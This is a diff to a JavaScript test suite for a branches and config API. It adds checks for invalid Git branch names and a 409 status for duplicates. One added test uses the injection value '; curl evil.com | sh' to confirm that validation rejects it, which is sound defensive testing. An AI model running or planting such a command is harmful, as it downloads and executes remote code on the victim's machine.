@@ -124,10 +124,30 @@ describe('Branches API', () => {
       expect(res.status).toBe(400);
     });
 
-    it('returns error for duplicate branch name', async () => {
+    it('returns 409 for duplicate branch name', async () => {
       const res = await request(server, 'POST', '/branches', { name: 'develop' });
-      expect(res.status).toBe(500);
+      expect(res.status).toBe(409);
       expect(res.body.error).toBeTruthy();
+    });
+
+    it('rejects branch names containing ".."', async () => {
+      const res = await request(server, 'POST', '/branches', { name: 'foo..bar' });
+      expect(res.status).toBe(400);
+    });
+
+    it('rejects branch names ending with ".lock"', async () => {
+      const res = await request(server, 'POST', '/branches', { name: 'refs.lock' });
+      expect(res.status).toBe(400);
+    });
+
+    it('rejects branch names with consecutive slashes', async () => {
+      const res = await request(server, 'POST', '/branches', { name: 'foo//bar' });
+      expect(res.status).toBe(400);
+    });
+
+    it('rejects branch names ending with "/"', async () => {
+      const res = await request(server, 'POST', '/branches', { name: 'foo/' });
+      expect(res.status).toBe(400);
     });
   });
 
@@ -146,6 +166,26 @@ describe('Branches API', () => {
     it('does not persist target branch when not included in update', async () => {
       await request(server, 'PATCH', '/config', { githubEnabled: true });
       expect(store.getConfig('targetBranch')).toBeUndefined();
+    });
+
+    it('rejects malicious targetBranch values (command injection prevention)', async () => {
+      // Attempt command injection via targetBranch
+      const res = await request(server, 'PATCH', '/config', { targetBranch: '; curl evil.com | sh' });
+      expect(res.status).toBe(200);
+      // targetBranch should remain unchanged (validation rejects the malicious value)
+      expect(res.body.targetBranch).toBe('master');
+    });
+
+    it('rejects targetBranch with ".." pattern', async () => {
+      const res = await request(server, 'PATCH', '/config', { targetBranch: 'a..b' });
+      expect(res.status).toBe(200);
+      expect(res.body.targetBranch).toBe('master');
+    });
+
+    it('rejects targetBranch ending with ".lock"', async () => {
+      const res = await request(server, 'PATCH', '/config', { targetBranch: 'refs.lock' });
+      expect(res.status).toBe(200);
+      expect(res.body.targetBranch).toBe('master');
     });
   });
 
